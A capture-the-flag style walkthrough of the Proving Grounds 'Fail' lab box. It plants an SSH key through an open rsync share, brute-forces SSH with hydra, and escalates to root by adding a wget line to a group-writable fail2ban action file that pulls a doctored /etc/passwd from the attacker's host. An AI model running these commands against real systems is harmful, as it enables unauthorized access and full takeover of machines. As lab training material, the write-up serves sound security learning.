---
title: Fail - Proving Grounds
published: true
---

![](assets/img/fail-pg/icon.jpg)

**Hey Guys!** Today we are going to pwn **Fail** from [Proving Grounds](https://portal.offensive-security.com/proving-grounds/practice).

**Fox** is an intermediate level linux based box. To be honest, I found this box to be more on the easier side. 

Before we begin, a brief overview of what exactly we are going to do in this box :
- We find SSH and Rsync services to be running on the box.
- With rsync, we put SSH key into a user's home directory.
- Finally, we escalate our privileges by exploiting a misconfiguration in an IDPS service.

With that said, let the show begin.

![](assets/img/fail-pg/meme1.gif)

## SCANNING :

```
┌──(root💀nehal)-[~]
└─# nmap -sC -sV 192.168.139.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 05:58 IST
Nmap scan report for 192.168.139.126
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.84 seconds
```

NMAP reveals SSH (**OpenSSH 7.9p1**) and Rsync (**Protocol version 31**) to be running on the box.

Now if you want, you can do a full port scan. But that would not be necessary here.

## ENUMERATING RSYNC:

Let us start by enumerating what shares we have in rsync.

```
┌──(root💀nehal)-[~]
└─# nc -nv 192.168.139.126 873
(UNKNOWN) [192.168.139.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
fox             fox home
@RSYNCD: EXIT
```

We can see that we have a share called **fox**. By the comment alogside, we can infer that **fox** is a user of the server and we have his home directory as the rsync share.

We can confirm the same with **rsync** utility.

```
┌──(root💀nehal)-[~]
└─# rsync -av --list-only rsync://192.168.139.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 19:51:59 .
lrwxrwxrwx              9 2020/12/04 01:52:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 09:42:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 09:42:36 .bashrc
-rw-r--r--            807 2019/04/18 09:42:36 .profile

sent 20 bytes  received 136 bytes  44.57 bytes/sec
total size is 4,562  speedup is 29.24
```

So this certainly looks like a user's home directory.

## SHELL AS FOX:

Since we have access to **fox**'s home directory, we can place SSH keys there with rsync and eventually login as **fox**.

```
┌──(root💀nehal)-[~]
└─# rsync -av keys/ rsync://fox@192.168.139.126/fox/.ssh
sending incremental file list
created directory /.ssh
./
authorized_keys

sent 698 bytes  received 66 bytes  218.29 bytes/sec
total size is 564  speedup is 0.74
┌──(root💀nehal)-[~]
└─# rsync -av --list-only rsync://192.168.139.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/06/14 00:40:41 .
lrwxrwxrwx              9 2020/12/04 01:52:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 09:42:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 09:42:36 .bashrc
-rw-r--r--            807 2019/04/18 09:42:36 .profile
drwxr-xr-x          4,096 2021/06/14 06:10:34 .ssh
-rw-r--r--            564 2021/06/14 06:08:52 .ssh/authorized_keys

sent 21 bytes  received 199 bytes  62.86 bytes/sec
total size is 5,126  speedup is 23.30
```

We have successfully placed our SSH public key to **fox**'s share.

Let us login now.

```
┌──(root💀nehal)-[~]
└─# ssh -i ~/Documents/keys/id_rsa fox@192.168.139.126
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ bash -i
fox@fail:~$ whoami && hostname
fox
fail
```

We have shell as user **fox**. You can read the user flag now.

![](assets/img/fail-pg/meme2.gif)

## PRIVILEGE ESCALATION:

```
fox@fail:~$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

We can see that the user **fox** is a part of **fail2ban**. 

**Fail2ban** is a great IDPS tool, not only it can **detect** attacks but also **block** the malicious IP addresses by using Linux iptables. Let us check if fail2ban is running on the box.

```
fox@fail:~$ /etc/init.d/fail2ban status
● fail2ban.service - Fail2Ban Service
   Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled; vendor preset: enabled)
   Active: active (running) since Sun 2021-06-13 15:17:01 EDT; 25s ago
     Docs: man:fail2ban(1)
  Process: 1162 ExecStartPre=/bin/mkdir -p /var/run/fail2ban (code=exited, status=0/SUCCESS)
 Main PID: 1163 (fail2ban-server)
    Tasks: 3 (limit: 2359)
   Memory: 10.5M
   CGroup: /system.slice/fail2ban.service
           └─1163 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

So **fail2ban** is active on the box. 

Although fail2ban can be used for services like HTTP, SMTP, IMAP etc. but most of sys-admins use it to protect the SSH service. fail2ban daemon reads the log files and if there is a malicious pattern detected (e.g multiple failed login requests) it executes a command for blocking the IP for certain period of time or maybe forever. As we have SSH active, there might be fail2ban rules for SSH login attempts.

```
fox@fail:/etc/fail2ban/action.d$ ls -al iptables-multiport.conf 
-rw-rw-r-- 1 root fail2ban 1420 Jan 18  2018 iptables-multiport.conf
```

After some enumeration, we find that there is a misconfiguration in fail2ban. The `iptables-multiport.conf` file has group write access for `fail2ban` group. Now this file is responsible for executing some commands when an IP is blocked. We can use this for elevating our privileges since we belong to the group `fail2ban`.

I am going to manipulate the `/etc/passwd` file to get root on the box.

First let us copy `/etc/passwd` to our local box. Then create a SHA-512 hash for the root user.

```
┌──(root💀nehal)-[~]
└─# mkpasswd -m sha-512 hacked
$6$OzVhHlXLINLt4Y3/$.XVGd1uxtozI89DUyFh5HO7s74Ue.31MhyQKCQTOoz0LCeA0wbxv4q4jMj5eNvzbtuqkHxP85XAgLbIk6TynL/
```

Now let us place the hash in the password field of the `/etc/passwd` copy.

```
┌──(root💀nehal)-[~]
└─# cat passwd.bak 
root:$6$OzVhHlXLINLt4Y3/$.XVGd1uxtozI89DUyFh5HO7s74Ue.31MhyQKCQTOoz0LCeA0wbxv4q4jMj5eNvzbtuqkHxP85XAgLbIk6TynL/:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fox:x:1000:1001::/home/fox:/bin/sh
```

Let us host a python server to fetch this to our remote box using wget.

```
fox@fail:/etc/fail2ban/action.d$ cat iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
              wget http://192.168.49.139/passwd.bak -O /etc/passwd
[Init]

```

I have edited the `iptables-multiport.conf` file to include the `wget` command that will fetch the `passwd.bak` file and save it to `/etc/passwd`.

Now we need to do some failed login attempts to trigger the `iptables-multiport.conf` file. We can use `hydra` for this.

```
┌──(root💀nehal)-[~]
└─# hydra -l fox -P /usr/share/wordlists/rockyou.txt 192.168.139.126 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-14 06:36:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.139.126:22/
[ERROR] ssh target does not support password auth
[STATUS] 56.00 tries/min, 56 tries in 00:01h, 14344356 to do in 4269:10h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

The `[ERROR] ssh target does not support password auth` might indicate that the box indeed blocked our IP for successive login attempts.

```
┌──(root💀nehal)-[~]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.139.126 - - [14/Jun/2021 06:37:43] "GET /passwd.bak HTTP/1.1" 200 -
```

We can see the server successfully requests for the `passwd.bak` file.

We just need to switch over to root now.

```
fox@fail:/etc/fail2ban/action.d$ su - root
Password: 
root@fail:~# id && hostname; date
uid=0(root) gid=0(root) groups=0(root)
fail
Sun 13 Jun 2021 03:39:55 PM EDT
root@fail:~# 
```

We are successful in getting root shell. You can now read the root flag too.

![](assets/img/fail-pg/meme3.gif)

So that was **Fail** from **Proving Grounds**. 

**Thanks** for reading this far. Hope you liked it.

I will see you in the next writeup. **Peace.**